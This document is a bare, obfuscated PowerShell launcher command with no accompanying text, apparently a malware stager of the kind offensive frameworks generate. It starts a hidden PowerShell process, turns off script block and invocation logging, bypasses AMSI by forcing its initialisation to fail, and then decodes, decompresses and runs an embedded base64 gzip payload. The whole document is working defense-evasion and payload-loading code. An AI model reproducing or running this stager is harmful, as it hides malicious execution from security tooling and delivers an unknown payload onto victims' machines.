powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $sYzD_=((''En''+''a{1}l{2''+''}Sc{0}ip''+''tBloc{''+''4}{5}n{''+''3''+''}oc''+''ationLogging'')-f''r'',''b'',''e'',''v'',''k'',''I''); $qY=((''{1''+''}crip{2}B{0}ockL''+''og''+''g''+''ing'')-f''l'',''S'',''t''); $le=((''EnableScri{1}{2}Bloc''+''{3}''+''{''+''0}oggin''+''g''+'''')-f''L'',''p'',''t'',''k'');If($PSVersionTable.PSVersion.Major -ge 3){ $oCDeV=[Collections.Generic.Dictionary[string,System.Object]]::new(); $u6Evm=[Ref].Assembly.GetType(((''{4}{3''+''}''+''st''+''em.''+''{''+''0}a''+''{9}a''+''{''+''2}eme''+''{''+''9''+''}t''+''.''+''{8}{''+''5}t{''+''7}mat''+''i{7''+''}{''+''9}.{8}''+''msi{1}ti{6}''+''s'')-f''M'',''U'',''g'',''y'',''S'',''u'',''l'',''o'',''A'',''n'')); $tRWB=[Ref].Assembly.GetType(((''{4}y''+''stem.''+''{3}ana{2}e''+''ment.{5}u''+''tomation.{0}ti''+''{''+''1}''+''s'')-f''U'',''l'',''g'',''M'',''S'',''A'')); $krZR=$tRWB.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); if ($u6Evm) { $u6Evm.GetField(((''a{4}''+''s''+''iInit''+''{''+''3''+''}ai''+''{0}''+''{2}{1}''+'''')-f''l'',''d'',''e'',''F'',''m''),''NonPublic,Static'').SetValue($null,$true); }; If ($krZR) { $a4L=$krZR.GetValue($null); $oCDeV.Add($sYzD_,0); $oCDeV.Add($le,0); $a4L[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$qY]=$oCDeV; If($a4L[$qY]){ $a4L[$qY][$le]=0; $a4L[$qY][$sYzD_]=0; } } Else { [Ref].Assembly.GetType(((''Sys''+''tem.{1}ana{5}emen''+''t''+''.''+''{''+''3''+''}{4}to''+''mation.Scri{2}tB{0}oc''+''k'')-f''l'',''M'',''p'',''A'',''u'',''g'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''''+''H4sIAEuUoGMCA7VWbW/aO{1}T+Pmn/IZqQCCqFQOnWW2nSdUJSwqAjS''+''3k''+''pDF2FxAkuj{1}MSp0B399/vMSSl''+''u2un3ivNXxLb5xw/fs6b/Yy5nERMwg0mfXv7RsrHwEmcUJJLC6N7rlWlUrJZjyvH7VJmDdbSR0meoT{1}uR6FD2PzyUsuSBDN+mNeuMEdpisMFJTiVK9Lf''+''0niJE3z6eXGHXS59k0p/1a''+''5otHBoLrbTHHeJpVPEPLHXi1xHQKvZMSVcLn/9Wq7MT{''+''1}vzmr7OHJrKZXuXc{1}zWPErLFel7RRx4s4uxXO4TN4nSyOe1MWFnzdqQpY6Pr8HaPe5jvoy8tAyXOV4nwTxL2OFW''+''wsxBSC7D7yCJXOR5CU7TclWaiQNm8/''+''mf8iw//UvGOAlxzWQcJ1Fs4+SeuDitdRzmUfwF+3PQsnlCWDCvVEDsPlp{1}ucQySqvSfzEjX+NNwd1rleSnSiA14EmlCl595p79yMs''+''oPmiWnwF6iIQKjCIagMHvgkS/CCE3fiaCjgvFmO13MECWB1FK9qofJaUq9eFw{1}0fJDqalmyTDlfkj4VLJX1dfa6tRKIIaO4OF2Sgi3vyo/oPzS/QBPTSE1Mux3MY+Ybi9Y05I3CJc5edcgn2K93TUCrFrACiX8w3stTHFgcMFySIyflLTQ8IfddWMUA8nyAW3poAKPF75EczBb3LZZH0cAneHOYRqyYckwY''+''V0n{1}i74nQxB6GyRp00rUqDDL''+''LUrUo2dij2q{1}''+''JiKcm3UMaj/W/5CLefUU5cJ+WFuXnl33zm52oRS3mSueBW4ODGjrFLHCooqUod4mF1Z5OgOL/8LCGaQylkD1i6B4fAiiDC5iJYEk/cc12p2ZibYUxxCBL7omFQJ4ASkWfIPracAH''+''vll3AWmXAIe8FMQckTlOBum0a8Ko1IwqEGCZbZ2f+A8HPlOWDREpz7Ri6ya6buuEiA0pqKEM3p2ZORcCDCSKJQdVL8vnUoMvK7uk7a54N29IBg6MYXa6TadrtjT4ekNwxVkzTM2+FoKr6BbfLdUA8GXIk/3dx0uiCHkvZ26SMzNfWOurMaKnI75MOoqw6FPtF61t3WRJ4aBpPgVtuYg+XE{1}IO0XmAG8FXNpasq''+''UyVQFZObV4aqEwUFttWxWo3pdd+lZv2Cqu''+''TBNm3UGYvzLLfTbTtbOEdvtTqT7Q267nfR0vjsGY2msRT6K6E/XV312vp+7oq5dZvqRDdurdFS4MHjUayOdWNqjWIzONkE1q{1}XbxlLFdZNsu3Fd{1}1Go9G9Z95Dn1489AGuNZp2CZ6aAd4FyELIvmXUXmw0{1}D45WmCq9soYwtrqxmRbaxH3vd1tp''+''/7HqE9wHCFLR8igkKI{1}cjbtemMcfbJG59ZQV7a7obLd6Hf1jU66m1X+HV69fx/U/dagPrJN1nGWKuDddVsr0j2BvdAZKbd+fST4a+us/sAm1BlojYgu6o0{1}aX9QwXe4Kz{1}cq3BvsHFuLSKt6S59wGQGF1YwiVjTWYHdcYAAHRLcEL9rgo6aUbIankyEre5GCbtbReAMuxeArZljQJyZkzrgQ522rbEr25w0PWyo9RP34zsIydmQMH7WnJf8IRdF++2b0uqu8yQwX2pJfSdJlw6FgIVeU1QNI0qMvHkMIiI0ZFm8Q1Y4YZ{1}C44bWXuQaojRyRfOCLgNt89DMRG8dmntEz/1VpEfByrGlFUuXl1OACNm7prUeZgFfVpXtmaJAJ1K2Smufpq+/l{1}bFOxlMVUUnE''+''6''+''QcDNO9YbBFfEmWfztL8Fr{1}UDZf4uklyuDgFRQ5KLqH2iOIU6OIPqXtcKfHADiSBmw14M4z8UgRcQHap3gtlbjo4E9fBKU4iNPz3xoseQFdwsf7dbAc136x+6oAUqp7an5a/XH{1}SeP5fdcfO4SDoA19gOLDw+Q5FvLseOLbvWcg/P18iNf654yfXsPrb9+I/gHf7Jv''+''oKAwAAA{0}{0}'')-f''='',''h'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
